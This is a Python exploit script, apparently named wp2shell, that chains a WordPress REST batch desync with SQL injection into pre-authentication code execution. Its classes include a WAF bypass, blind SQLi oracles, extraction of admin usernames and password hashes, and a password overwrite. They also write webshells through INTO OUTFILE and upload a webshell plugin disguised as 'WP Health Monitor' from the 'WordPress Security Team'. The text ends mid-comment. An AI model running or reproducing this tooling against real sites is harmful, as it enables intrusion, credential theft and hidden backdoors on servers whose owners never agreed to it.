#!/usr/bin/env python3
"""
wp2shell - Pre-Authentication RCE in WordPress Core
CVE-2026-63030 + CVE-2026-60137 | CVSS 9.8
Discovered by Adam Kues (Assetnote / Searchlight Cyber)
SQLi also credited to TF1T, dtro, haongo.

Full RCE chain (batch confusion + SQLi):
  WordPress 6.9.0–6.9.4 and 7.0.0–7.0.1

SQLi sink only (needs facilitating plugin/theme):
  WordPress 6.8.0–6.8.5

Fixed in: 6.8.6 / 6.9.5 / 7.0.2

Vulnerability chain:
  1. WP_REST_Server::serve_batch_request_v1() has an index desync:
     errored sub-requests are appended to $validation but NOT $matches.
     The dispatch loop indexes $matches[$i], so every sub-request after
     the error is dispatched against the NEXT handler's route/perms.

  2. serve_request() lacks a re-entrancy guard, so a sub-request can
     start a fresh top-level REST dispatch inside a batch, creating a
     nested batch whose inner sub-requests also suffer the desync.

  3. WP_Query::get_posts() only sanitises author__not_in when it is an
     array (is_array check). When passed as a STRING, it skips absint()
     and goes straight to implode() -> raw interpolation into WHERE.

  4. The nested batch routes an unauthenticated request carrying a
     crafted author_exclude STRING (mapped to author__not_in) through
     a handler that feeds it unsanitised into WP_Query -> SQL injection.
"""

import requests
import json
import sys
import time
import re
import io
import uuid
import zipfile
import hashlib
import argparse
import string
import random
import base64
import statistics
import ssl
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter
from urllib.parse import quote, urlencode, urlparse, urlunparse, urlunsplit

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
                 ____      _          _ _
 __      ___ __ |___ \ ___| |__   ___| | |
 \ \ /\ / / '_ \  __) / __| '_ \ / _ \ | |
  \ V  V /| |_) |/ __/\__ \ | | |  __/ | |
   \_/\_/ | .__/|_____|___/_| |_|\___|_|_|
          |_|   CVE-2026-63030

  Pre-Auth RCE in WordPress Core REST API
"""

# ---- Helpers ---------------------------------------------------------------

def log(msg, level="*"):
    colors = {"*": "\033[94m", "+": "\033[92m", "-": "\033[91m",
              "!": "\033[93m", ">": "\033[96m"}
    c = colors.get(level, "")
    print(f"  {c}[{level}]\033[0m {msg}")

def vlog(msg, verbose):
    if verbose:
        log(msg, "!")

def rand_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))


# ---- Core exploit class ----------------------------------------------------

class WP2Shell:
    """
    Exploit chain overview:
      Phase 1  Probe the batch desync (non-destructive)
      Phase 2  Confirm SQLi via nested batch re-entrancy
      Phase 3  RCE: cred extraction -> admin -> plugin upload
    """

    SHELL_PLUGIN = "wp-health-monitor"

    def __init__(self, target, proxy=None, timeout=30,
                 table_prefix="wp_", verbose=False,
                 sleep_duration=0.15, time_based=False):
        self.target = target.rstrip('/')
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({
            'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                           'AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/127.0.0.0 Safari/537.36'),
            'Accept': 'application/json',
        })
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.timeout = timeout
        self.tp = table_prefix
        self.verbose = verbose
        self.sleep_sec = sleep_duration
        self.time_based = time_based
        self._canonical = False
        self.batch_url = None
        self.shell_url = None
        self.shell_key = None
        self.cutoff = None
        self._resolve_batch_endpoint()

    # -- Redirect-safe HTTP helpers ------------------------------------------
    # requests downgrades POST→GET on 301/302/303, silently dropping the
    # batch payload.  Pin the canonical URL once and POST without redirect.

    def _canonicalize_base(self):
        """Follow root redirect once to lock canonical scheme://host."""
        if self._canonical:
            return
        self._canonical = True
        try:
            r = self.s.get(self.target + "/", timeout=self.timeout,
                           allow_redirects=True)
            final = r.url.rstrip("/")
            if final != self.target:
                vlog(f"Canonical base: {self.target} → {final}",
                     self.verbose)
                self.target = final
                self.batch_url = None
        except Exception:
            pass

    def _post_no_redirect(self, url, **kwargs):
        """POST preserving body across redirects (301/302/303 keep POST)."""
        kwargs.setdefault("timeout", self.timeout)
        r = self.s.post(url, allow_redirects=False, **kwargs)
        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            if loc:
                vlog(f"POST redirect {url} → {loc}", self.verbose)
                return self.s.post(loc, allow_redirects=False, **kwargs)
        return r

    # -- Endpoint resolution -------------------------------------------------

    def _resolve_batch_endpoint(self):
        self._waf_bypass = False

        # Try standard POST first
        candidates = [
            self.target + "/wp-json/batch/v1",
            self.target + "/?rest_route=/batch/v1",
        ]
        for url in candidates:
            try:
                r = self.s.post(url, json={"requests": []},
                                timeout=self.timeout)
                ct = r.headers.get('Content-Type', '')
                if r.status_code != 404 and 'json' in ct:
                    self.batch_url = url
                    vlog(f"Batch endpoint resolved: {url}", self.verbose)
                    return
                elif r.status_code != 404:
                    vlog(f"Non-JSON from {url} (HTTP {r.status_code}, "
                         f"{ct}): {r.text[:200]}", self.verbose)
            except requests.RequestException as e:
                vlog(f"Request failed for {url}: {e}", self.verbose)
                continue

        # WAF bypass: GET + _method=POST + PHP array query params.
        # CloudFront/AWS WAF blocks POST but allows GET. WordPress
        # honours _method=POST in query string and parses PHP-style
        # array params (requests[0][method]=...).
        log("POST blocked, trying WAF bypass (GET + _method=POST)...", "!")
        bypass_url = self.target + "/?rest_route=/batch/v1&_method=POST"
        try:
            params = {
                "rest_route": "/batch/v1",
                "_method": "POST",
                "validation": "normal",
            }
            r = self.s.get(self.target + "/", params=params,
                           timeout=self.timeout)
            ct = r.headers.get('Content-Type', '')
            if 'json' in ct and r.status_code != 403:
                self._waf_bypass = True
                self.batch_url = self.target + "/"
                log("WAF bypass confirmed: GET + _method=POST", "+")
                return
        except requests.RequestException as e:
            vlog(f"WAF bypass failed: {e}", self.verbose)

        self.batch_url = candidates[1]
        vlog("Defaulting to query-string batch endpoint", self.verbose)

    # -- Version detection ----------------------------------------------------

    # Vuln ranges
    #   Full RCE chain (batch confusion + SQLi): 6.9.0–6.9.4, 7.0.0–7.0.1
    #   SQLi sink only (needs facilitating plugin/theme): 6.8.0–6.8.5
    #   Fixed: 6.8.6 / 6.9.5 / 7.0.2
    _FULL_CHAIN = [
        ((6, 9, 0), (6, 9, 4)),
        ((7, 0, 0), (7, 0, 1)),
    ]
    _SQLI_ONLY = [
        ((6, 8, 0), (6, 8, 5)),
    ]

    @staticmethod
    def _version_in_range(ver, ranges):
        for lo, hi in ranges:
            if lo <= ver <= hi:
                return True
        return False

    @staticmethod
    def _classify_version(ver):
        """Return 'full_chain', 'sqli_only', or 'patched'."""
        if WP2Shell._version_in_range(ver, WP2Shell._FULL_CHAIN):
            return 'full_chain'
        if WP2Shell._version_in_range(ver, WP2Shell._SQLI_ONLY):
            return 'sqli_only'
        return 'patched'

    def detect_version(self):
        """Try to fingerprint the WordPress version.

        Returns (major, minor, patch) tuple or None.
        """
        methods = [
            # REST API index (fastest, most reliable)
            lambda: self._version_from_rest(),
            # HTML meta generator tag
            lambda: self._version_from_html(),
            # RSS feed
            lambda: self._version_from_feed(),
        ]
        for method in methods:
            ver = method()
            if ver:
                return ver
        return None

    def _version_from_rest(self):
        try:
            r = self.s.get(self.target + "/wp-json/", timeout=10)
            m = re.search(
                r'"generator":"[^"]*?(\d+)\.(\d+)(?:\.(\d+))?"',
                r.text)
            if not m:
                r = self.s.get(
                    self.target + "/?rest_route=/", timeout=10)
                m = re.search(
                    r'"generator":"[^"]*?(\d+)\.(\d+)(?:\.(\d+))?"',
                    r.text)
            if m:
                return (
                    int(m.group(1)),
                    int(m.group(2)),
                    int(m.group(3)) if m.group(3) else 0,
                )
        except Exception:
            pass
        return None

    def _version_from_html(self):
        try:
            r = self.s.get(self.target + "/", timeout=10)
            m = re.search(
                r'name="generator"\s+content="WordPress\s+(\d+)\.(\d+)(?:\.(\d+))?"',
                r.text)
            if m:
                return (
                    int(m.group(1)),
                    int(m.group(2)),
                    int(m.group(3)) if m.group(3) else 0,
                )
        except Exception:
            pass
        return None

    def _version_from_feed(self):
        try:
            for path in ("/feed/", "/feed/rss2/"):
                r = self.s.get(self.target + path, timeout=10)
                m = re.search(
                    r'[?&]v=(\d+)\.(\d+)(?:\.(\d+))?', r.text)
                if m:
                    return (
                        int(m.group(1)),
                        int(m.group(2)),
                        int(m.group(3)) if m.group(3) else 0,
                    )
        except Exception:
            pass
        return None

    def check_version(self):
        """Detect version and check against known-vulnerable ranges.

        Returns (ver, classification) where classification is one of:
          'full_chain' — vulnerable to the complete pre-auth RCE
          'sqli_only'  — SQLi sink present but needs a facilitating plugin
          'patched'    — fixed or out of documented range
          None         — version could not be detected (ver is None)
        """
        ver = self.detect_version()
        if ver is None:
            return None, None
        return ver, self._classify_version(ver)

    # -- Low-level batch helpers ---------------------------------------------

    @staticmethod
    def _sub_request_to_params(sub_requests, prefix=""):
        """Convert batch sub-requests to PHP array query params.

        Turns [{"method":"POST","path":"http://:"},...] into:
          requests[0][method]=POST&requests[0][path]=http://:&...
        """
        params = {}
        for i, req in enumerate(sub_requests):
            for key, val in req.items():
                if isinstance(val, dict):
                    for k2, v2 in val.items():
                        if isinstance(v2, list):
                            for j, item in enumerate(v2):
                                if isinstance(item, dict):
                                    for k3, v3 in item.items():
                                        pkey = (f"requests[{i}][{key}]"
                                                f"[{k2}][{j}][{k3}]")
                                        params[pkey] = str(v3)
                                else:
                                    pkey = (f"requests[{i}][{key}]"
                                            f"[{k2}][{j}]")
                                    params[pkey] = str(item)
                        else:
                            pkey = f"requests[{i}][{key}][{k2}]"
                            params[pkey] = str(v2)
                elif isinstance(val, list):
                    for j, item in enumerate(val):
                        if isinstance(item, dict):
                            for k2, v2 in item.items():
                                pkey = f"requests[{i}][{key}][{j}][{k2}]"
                                params[pkey] = str(v2)
                        else:
                            pkey = f"requests[{i}][{key}][{j}]"
                            params[pkey] = str(item)
                else:
                    pkey = f"requests[{i}][{key}]"
                    params[pkey] = str(val)
        return params

    def _batch(self, sub_requests, extra_timeout=15):
        self._canonicalize_base()
        if self._waf_bypass:
            params = {
                "rest_route": "/batch/v1",
                "_method": "POST",
                "validation": "normal",
            }
            params.update(self._sub_request_to_params(sub_requests))
            r = self.s.get(self.batch_url, params=params,
                           timeout=self.timeout + extra_timeout)
        else:
            payload = {"validation": "normal", "requests": sub_requests}
            r = self._post_no_redirect(self.batch_url, json=payload,
                                       timeout=self.timeout + extra_timeout)
        ct = r.headers.get('Content-Type', '')
        if 'json' not in ct:
            raise ValueError(
                f"Non-JSON response (HTTP {r.status_code}, "
                f"Content-Type: {ct}): {r.text[:300]}"
            )
        return r.json()

    def _batch_inner(self, inner_requests, extra_timeout=15):
        """Shortcut: wrap inner requests with 4-request outer batch."""
        return self._batch(
            self._outer_batch(inner_requests)["requests"], extra_timeout)

    @staticmethod
    def _malformed():
        return {"method": "POST", "path": "///"}

    @staticmethod
    def _outer_batch(inner_requests):
        """Build the 4-request outer batch (dinosn-verified stable pattern).

        [0] categories touch → occupies index 0
        [1] malformed       → $matches shift +1 (carrier at [2]→batch at [3])
        [2] carrier         → self-calls batch handler with inner requests
        [3] batch/v1        → supplies the batch handler for carrier

        The extra [0] ensures the malformed trigger at index=1 shifts
        carrier→batch correctly even on restrictive WP configurations.
        """
        return {"requests": [
            {"method": "POST", "path": "/v2/categories",
             "body": {"name": "x"}},
            {"method": "POST", "path": "///",
             "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1",
             "body": {"requests": []}},
        ]}

    # ========================================================================
    # Phase 1: Non-destructive detection
    # ========================================================================

    def check(self):
        """Desync detection probe (Hadrian method).

        Sub-requests:
          0  malformed         -> triggers the $matches off-by-one
          1  DELETE /categories/0
          2  POST /block-renderer/core/paragraph

        Vulnerable:  categories response code = 'block_cannot_read'
        Patched:     categories response code = 'rest_term_invalid'
        """
        log("Sending desync detection probe...")
        probe = [
            self._malformed(),
            {"method": "DELETE", "path": "/wp/v2/categories/0"},
            {"method": "POST",   "path": "/wp/v2/block-renderer/core/paragraph"},
        ]
        try:
            data = self._batch(probe)
        except Exception as e:
            log(f"Probe request failed: {e}", "-")
            return None

        responses = data.get('responses', [])
        if len(responses) < 2:
            log("Unexpected response structure", "-")
            vlog(f"Raw: {json.dumps(data)[:500]}", self.verbose)
            return None

        body = responses[1].get('body', {})
        code = body.get('code', '')
        vlog(f"Categories sub-response code: {code}", self.verbose)

        if code == 'block_cannot_read':
            log("VULNERABLE - desync confirmed: categories "
                "received block-renderer handler", "+")
            return True
        if code == 'rest_term_invalid':
            log("Patched - handler alignment is correct", "-")
            return False

        log(f"Inconclusive response code: {code}", "!")
        vlog(f"Full body: {json.dumps(body, indent=2)}", self.verbose)
        return None

    # ========================================================================
    # Phase 2: SQL injection via nested batch re-entrancy
    # ========================================================================
    #
    # Attack structure (two-level batch):
    #
    # Outer batch:
    #   [0] malformed "http://:" -> WP_Error, shifts $matches
    #   [1] POST /wp/v2/posts   -> desynced to [2]'s handler (/batch/v1)
    #   [2] POST /batch/v1      -> provides the batch handler for [1]
    #
    # Because [1] is dispatched to the batch handler, its body is
    # processed as a NEW batch of sub-requests (re-entrancy, Fix 1).
    #
    # Inner batch (body of outer[1]):
    #   [0] malformed "http://:" -> WP_Error, shifts inner $matches
    #   [1] GET /categories?author_exclude=SQLI -> desynced to posts handler
    #   [2] GET /wp/v2/posts    -> provides the posts handler for [1]
    #
    # Inner[1] is dispatched to the posts handler. The categories schema
    # does NOT define author_exclude, so it passed validation unvalidated.
    # The posts handler maps it to WP_Query's author__not_in. Since the
    # value is a STRING (not array), is_array() fails, absint() is
    # skipped, and the raw string is interpolated into the WHERE clause.
    #
    # Injection payload format:
    #   author_exclude = "SELECT IF((condition),SLEEP(n),0)"
    #   -> NOT IN (SELECT IF((condition),SLEEP(n),0))
    #
    # The subquery evaluates the condition. If true, SLEEP fires and the
    # response is delayed. Time-based blind boolean oracle.

    # -- Boolean oracle dispatch ---------------------------------------------

    def _content_bool(self, condition):
        """Content-based boolean oracle (NO SLEEP, deterministic).

        Injects a subquery that returns post_author=1 when condition is TRUE
        (filtering the "Hello world!" post → 0 results) or 999999999 when
        FALSE (no filter → posts returned).  Reads the inner batch response
        body to count returned posts.

        Returns: True (condition true, 0 posts), False (condition false,
        posts present), or None (response malformed / error).
        """
        sqli = f"SELECT IF(({condition}), 1, 999999999)"
        inner = [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": "/wp/v2/categories?" + urlencode(
                {"author_exclude": sqli})},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        outer = [
            self._malformed(),
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner}},
            {"method": "POST", "path": "/batch/v1"},
        ]
        try:
            data = self._batch(outer, extra_timeout=15)
            inner_body = data.get('responses', [{}])[1].get('body', {})
            inner_r = inner_body.get('responses', [])
            if len(inner_r) >= 2:
                body = inner_r[1].get('body', {})
                if isinstance(body, list):
                    return len(body) == 0  # True → 0 posts, False → >0 posts
        except Exception:
            pass
        return None

    def _oracle_bool(self, condition):
        """Dispatch to content-based (default) or time-based boolean oracle."""
        if self.time_based:
            elapsed = self._sqli_probe(condition)
            result = elapsed > self.cutoff
            vlog(f"  time_bool({condition[:50]}...) "
                 f"= {result}  ({elapsed:.3f}s)", self.verbose)
            return result
        return self._content_bool(condition)

    def _sqli_probe(self, condition):
        """Send one nested-batch SQLi probe and return elapsed time."""
        inner_requests = [
            {"method": "GET", "path": "http://:"},
            {
                "method": "GET",
                "path": "/wp/v2/categories?" + urlencode({
                    "author_exclude": (
                        f"SELECT IF(({condition}),"
                        f"SLEEP({self.sleep_sec}),0)"
                    ),
                }),
            },
            {"method": "GET", "path": "/wp/v2/posts"},
        ]

        outer_batch = [
            self._malformed(),
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {"requests": inner_requests},
            },
            {"method": "POST", "path": "/batch/v1"},
        ]

        start = time.perf_counter()
        try:
            self._batch(outer_batch, extra_timeout=15)
        except Exception:
            pass
        return time.perf_counter() - start

    def _sqli_calibrate(self, samples=3):
        """Calibrate: content-based just verifies True≠False;
        time-based measures SLEEP baseline vs delay."""
        if not self.time_based:
            log("Verifying content-based boolean oracle...")
            t1 = self._content_bool("1=1")
            t2 = self._content_bool("1=0")
            if t1 is None or t2 is None:
                log("Content oracle not responding (no published posts?)", "-")
                return False
            if t1 is True and t2 is False:
                log(f"Content oracle verified: 1=1→{t1}, 1=0→{t2}", "+")
                return True
            log(f"Content oracle ambiguous: 1=1→{t1}, 1=0→{t2}", "-")
            return False
        # Time-based calibration
        log("Calibrating timing oracle...")
        fast_times = [self._sqli_probe("1=0") for _ in range(samples)]
        slow_times = [self._sqli_probe("1=1") for _ in range(samples)]

        fast = statistics.median(fast_times)
        slow = statistics.median(slow_times)
        self.cutoff = (fast + slow) / 2

        vlog(f"Fast median: {fast:.3f}s  Slow median: {slow:.3f}s  "
             f"Cutoff: {self.cutoff:.3f}s", self.verbose)

        if slow - fast < 0.05:
            log(f"Timing delta too small: {slow - fast:.3f}s "
                f"(fast={fast:.3f}s slow={slow:.3f}s)", "-")
            return False

        log(f"Oracle calibrated: fast={fast:.3f}s "
            f"slow={slow:.3f}s delta={slow - fast:.3f}s", "+")
        return True

    def _sqli_bool(self, condition):
        """Boolean oracle: returns True if condition is true in the DB.
        Dispatches to content-based (default) or time-based (--time-based)."""
        return self._oracle_bool(condition)

    def _sqli_confirm(self):
        """Confirm blind SQLi via nested batch re-entrancy.

        Content mode (default): deterministic 1=1/1=0 differential via
        post count in response body.  Time mode (--time-based): SLEEP
        latency comparison.
        """
        mode = "time-based" if self.time_based else "content-based"
        log(f"Confirming SQL injection via nested batch ({mode})...")

        if not self._sqli_calibrate():
            log("SQL injection did not fire", "-")
            return False

        if not self.time_based:
            # Content oracle already verified by _sqli_calibrate
            log("SQL injection CONFIRMED via nested batch", "+")
            return True

        t1 = self._sqli_bool("1=1")
        t2 = self._sqli_bool("1=0")

        if t1 and not t2:
            log("SQL injection CONFIRMED via nested batch", "+")
            return True

        log("Verification failed (1=1 should be slow, 1=0 fast)", "-")
        return False

    # -- Data extraction (time-based blind) ----------------------------------

    def _extract_char(self, query, pos):
        """Binary-search one character at position `pos` in query result."""
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            cond = (f"ASCII(SUBSTRING(COALESCE(({query}),''),"
                    f"{pos},1))>={mid}")
            if self._sqli_bool(cond):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo) if lo > 32 else None

    def _extract_length(self, query, max_len=256):
        """Binary-search the CHAR_LENGTH() of a query result."""
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi + 1) // 2
            cond = (f"CHAR_LENGTH(COALESCE(({query}),''))"
                    f">={mid}")
            if self._sqli_bool(cond):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _extract_string(self, query, label="value", max_len=128):
        """Extract a full string character by character."""
        log(f"Extracting {label}...")
        length = self._extract_length(query, max_len)
        if length == 0:
            log(f"Empty or null result for {label}", "-")
            return None
        log(f"{label} length = {length}", "*")

        result = []
        for pos in range(1, length + 1):
            ch = self._extract_char(query, pos)
            if ch is None:
                vlog(f"Failed at position {pos}", self.verbose)
                break
            result.append(ch)
            progress = ''.join(result)
            sys.stdout.write(
                f"\r  [\033[94m*\033[0m] {label} [{pos}/{length}]: "
                f"{progress}")
            sys.stdout.flush()

        print()
        extracted = ''.join(result)
        log(f"{label}: {extracted}", "+")
        return extracted

    # ========================================================================
    # Phase 3: RCE paths
    # ========================================================================

    # -- 3a: Direct webshell via SELECT INTO OUTFILE -------------------------

    def _try_outfile(self, webroot, shell_key):
        """Write a webshell via SELECT ... INTO OUTFILE.

        Requires MySQL FILE privilege and permissive secure_file_priv.
        Uses the nested batch to deliver the OUTFILE query.
        """
        log("Attempting direct shell write via SELECT INTO OUTFILE...")
        shell_hash = hashlib.sha256(shell_key.encode()).hexdigest()
        shell_php = (
            f"<?php if(hash_equals('{shell_hash}',"
            f"hash('sha256',$_REQUEST['k']??'')))"
            "{echo '<pre>'.htmlspecialchars("
            "shell_exec($_REQUEST['c'])).'</pre>';} ?>"
        )

        targets = [
            (f"{webroot}/wp-content/uploads/{self.SHELL_PLUGIN}.php",
             f"/wp-content/uploads/{self.SHELL_PLUGIN}.php"),
            (f"{webroot}/{self.SHELL_PLUGIN}.php",
             f"/{self.SHELL_PLUGIN}.php"),
        ]

        for fpath, url_path in targets:
            vlog(f"Trying INTO OUTFILE -> {fpath}", self.verbose)
            escaped = shell_php.replace("'", "\\'").replace('"', '\\"')
            sqli_value = (
                f"SELECT '{escaped}' INTO OUTFILE '{fpath}'"
            )

            inner_requests = [
                {"method": "GET", "path": "http://:"},
                {
                    "method": "GET",
                    "path": "/wp/v2/categories?" + urlencode({
                        "author_exclude": sqli_value,
                    }),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
            outer_batch = [
                self._malformed(),
                {
                    "method": "POST",
                    "path": "/wp/v2/posts",
                    "body": {"requests": inner_requests},
                },
                {"method": "POST", "path": "/batch/v1"},
            ]
            try:
                self._batch(outer_batch, extra_timeout=10)
            except Exception:
                continue

            check_url = self.target + url_path
            try:
                r = self.s.get(check_url,
                               params={"k": shell_key,
                                       "c": "echo wp2shell_ok"},
                               timeout=10)
                if "wp2shell_ok" in r.text:
                    self.shell_url = check_url
                    self.shell_key = shell_key
                    log(f"Webshell deployed via OUTFILE!", "+")
                    log(f"Shell: {check_url}", "+")
                    return True
            except Exception:
                continue

        log("OUTFILE failed (expected on hardened MySQL configs)", "!")
        return False

    # -- 3a2: UNION SELECT INTO OUTFILE (faster, cleaner) --------------------
    # WordPress 6.9 wp_posts has 23 columns.  Column 5 is post_content (longtext)
    # which accepts arbitrary hex-encoded PHP code without type conflicts.
    _WP_POSTS_COLS = 23
    _OUTFILE_COL_IDX = 5  # post_content column

    def _try_union_outfile(self, webroot, shell_key):
        """Write a PHP webshell via UNION SELECT ... INTO OUTFILE.

        NOTE: This technique requires MySQL FILE privilege AND works ONLY when
        WP_Query does NOT use the split-pagination optimisation (i.e. when
        `posts_per_page` is -1 or `no_found_rows` is true). Under default
        pagination WP_Query selects only `wp_posts.ID` (1 column), and the
        multi-line SQL structure defeats `-- ` line comments — MySQL's
        ORDER BY / LIMIT on subsequent lines causes "global ORDER clause"
        error 1228.  Falls through gracefully to the next phase.
        """
        log("Phase 3a: UNION SELECT INTO OUTFILE (direct file write)...")

        shell_hash = hashlib.sha256(shell_key.encode()).hexdigest()
        shell_php = (
            f"<?php if(hash_equals('{shell_hash}',"
            f"hash('sha256',$_REQUEST['k']??'')))"
            "{echo '<pre>'.htmlspecialchars("
            "shell_exec($_REQUEST['c'])).'</pre>';} ?>"
        )
        shell_hex = "0x" + shell_php.encode().hex()

        union_cols = []
        for i in range(1, self._WP_POSTS_COLS + 1):
            if i == self._OUTFILE_COL_IDX:
                union_cols.append(shell_hex)
            else:
                union_cols.append("''")
        union_sel = ",".join(union_cols)

        paths = [
            (f"{webroot}/wp-content/uploads/wp-health-monitor.php",
             "/wp-content/uploads/wp-health-monitor.php"),
            (f"{webroot}/wp-health-monitor.php",
             "/wp-health-monitor.php"),
        ]

        for filepath, url_path in paths:
            # Try /* block comment to handle multi-line SQL
            sqli_value = (
                f"0) AND 1=0 UNION SELECT "
                f"{union_sel} "
                f"INTO OUTFILE '{filepath}'/*"
            )

            vlog(f"  UNION OUTFILE → {filepath}", self.verbose)
            inner = [
                {"method": "GET", "path": "http://:"},
                {"method": "GET", "path": "/wp/v2/categories?" + urlencode({
                    "author_exclude": sqli_value,
                })},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
            outer = [
                self._malformed(),
                {"method": "POST", "path": "/wp/v2/posts",
                 "body": {"requests": inner}},
                {"method": "POST", "path": "/batch/v1"},
            ]
            try:
                self._batch(outer, extra_timeout=10)
            except Exception:
                continue

            # Verify the shell
            check_url = self.target + url_path
            try:
                r = self.s.get(check_url,
                               params={"k": shell_key, "c": "echo wp2shell_ok"},
                               timeout=10)
                if "wp2shell_ok" in r.text:
                    self.shell_url = check_url
                    self.shell_key = shell_key
                    log(f"UNION OUTFILE webshell deployed!", "+")
                    log(f"Shell: {check_url}", "+")
                    return True
            except Exception:
                continue

        log("UNION OUTFILE failed (split-query or no FILE priv)", "!")
        return False

    # -- 3b: Admin credential extraction -------------------------------------

    def _extract_admin_creds(self):
        """Pull admin user_login and user_pass via blind SQLi."""
        user = self._extract_string(
            f"SELECT user_login FROM {self.tp}users "
            f"ORDER BY ID ASC LIMIT 1",
            label="admin_login", max_len=60
        )
        if not user:
            return None, None

        phash = self._extract_string(
            f"SELECT user_pass FROM {self.tp}users "
            f"WHERE user_login=0x{user.encode().hex()}",
            label="admin_hash", max_len=34
        )
        return user, phash

    # -- 3c: WP login and plugin upload --------------------------------------

    def _wp_login(self, username, password):
        login_url = self.target + "/wp-login.php"
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": self.target + "/wp-admin/",
            "testcookie": "1",
        }
        self.s.cookies.set("wordpress_test_cookie", "WP+Cookie+check")
        r = self.s.post(login_url, data=data, timeout=self.timeout,
                        allow_redirects=False)
        if r.status_code in (302, 303):
            loc = r.headers.get('Location', '')
            if 'wp-admin' in loc and 'login' not in loc.lower():
                log("Authenticated as admin", "+")
                self.s.get(loc, timeout=self.timeout)
                return True
        log("Login failed", "-")
        return False

    def _upload_shell_plugin(self, shell_key):
        log("Uploading webshell plugin via wp-admin...")
        shell_hash = hashlib.sha256(shell_key.encode()).hexdigest()
        plugin_php = (
            "<?php\n"
            "/*\n"
            "Plugin Name: WP Health Monitor\n"
            "Description: System health monitoring utility.\n"
            "Version: 1.0.3\n"
            "Author: WordPress Security Team\n"
            "*/\n"
            f"if(isset($_REQUEST['k'])&&hash_equals('{shell_hash}',"
            f"hash('sha256',$_REQUEST['k']??''))){{@eval("
            f"base64_decode($_REQUEST['c']));}} ?>\n"
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(
                f"{self.SHELL_PLUGIN}/{self.SHELL_PLUGIN}.php",
                plugin_php)
        buf.seek(0)

        for page in ["/wp-admin/plugin-install.php",
                     "/wp-admin/update.php?action=upload-plugin"]:
            r = self.s.get(self.target + page, timeout=self.timeout)
            m = re.search(r'name="_wpnonce"\s+value="([^"]+)"', r.text)
            if m:
                break
        if not m:
            log("Could not obtain upload nonce", "-")
            return False

        nonce = m.group(1)
        vlog(f"Upload nonce: {nonce}", self.verbose)

        upload_url = (self.target +
                      "/wp-admin/update.php?action=upload-plugin")
        r = self.s.post(
            upload_url,
            data={"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
            files={"pluginzip": (f"{self.SHELL_PLUGIN}.zip",
                                 buf, "application/zip")},
            timeout=self.timeout,
        )

        if "successfully" in r.text.lower() or self.SHELL_PLUGIN in r.text:
            log("Plugin uploaded", "+")
        else:
            log("Plugin upload may have failed, checking...", "!")

        r = self.s.get(self.target + "/wp-admin/plugins.php",
                       timeout=self.timeout)
        act_m = re.search(
            rf'action=activate&amp;plugin='
            rf'({re.escape(self.SHELL_PLUGIN)}[^"&]+)'
            rf'&amp;_wpnonce=([a-f0-9]+)', r.text)
        if act_m:
            plugin_file = act_m.group(1).replace('&amp;', '&')
            act_nonce = act_m.group(2)
            self.s.get(
                f"{self.target}/wp-admin/plugins.php?"
                f"action=activate&plugin={plugin_file}"
                f"&_wpnonce={act_nonce}",
                timeout=self.timeout)
            log("Plugin activated", "+")

        shell_url = (f"{self.target}/wp-content/plugins/"
                     f"{self.SHELL_PLUGIN}/{self.SHELL_PLUGIN}.php")
        test_payload = base64.b64encode(
            b"echo 'wp2shell_ok';").decode()
        try:
            r = self.s.get(shell_url,
                           params={"k": shell_key, "c": test_payload},
                           timeout=10)
            if "wp2shell_ok" in r.text:
                self.shell_url = shell_url
                self.shell_key = shell_key
                log(f"Webshell verified at {shell_url}", "+")
                return True
        except Exception:
            pass

        log("Shell not responding (may need manual activation)", "!")
        self.shell_url = shell_url
        self.shell_key = shell_key
        return False

    # -- 3d: Password update via SQLi ----------------------------------------

    def _sqli_update_password(self, username, new_password):
        """Try to UPDATE the admin password directly via SQLi.

        WordPress accepts raw MD5 hashes as a legacy fallback.
        Uses nested batch to deliver the stacked query attempt.
        """
        log(f"Attempting password update via SQLi for '{username}'...")
        md5_hash = hashlib.md5(new_password.encode()).hexdigest()
        user_hex = "0x" + username.encode().hex()

        sqli_value = (
            f"SELECT 1;UPDATE {self.tp}users SET "
            f"user_pass='{md5_hash}' WHERE "
            f"user_login={user_hex}"
        )

        inner_requests = [
            {"method": "GET", "path": "http://:"},
            {
                "method": "GET",
                "path": "/wp/v2/categories?" + urlencode({
                    "author_exclude": sqli_value,
                }),
            },
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        outer_batch = [
            self._malformed(),
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {"requests": inner_requests},
            },
            {"method": "POST", "path": "/batch/v1"},
        ]
        try:
            self._batch(outer_batch, extra_timeout=10)
        except Exception:
            pass

        if self._wp_login(username, new_password):
            return True

        log("Stacked query did not work (normal for mysqli)", "!")
        return False

    # ========================================================================
    # Phase 3b2: Changeset-forging admin creation (vulhub / sergiointel)
    #
    # Leverages WordPress's Customizer changeset workflow:
    #   1. Create 3 real oEmbed cache posts (via UNION SELECT + embed shortcode)
    #   2. Blind-extract cache post IDs, table prefix, and existing admin ID
    #   3. UNION SELECT 7 forged wp_posts rows including a customize_changeset
    #      whose nav_menu_item settings carry admin user_id
    #   4. WordPress caches forged rows as WP_Post objects; changeset publish
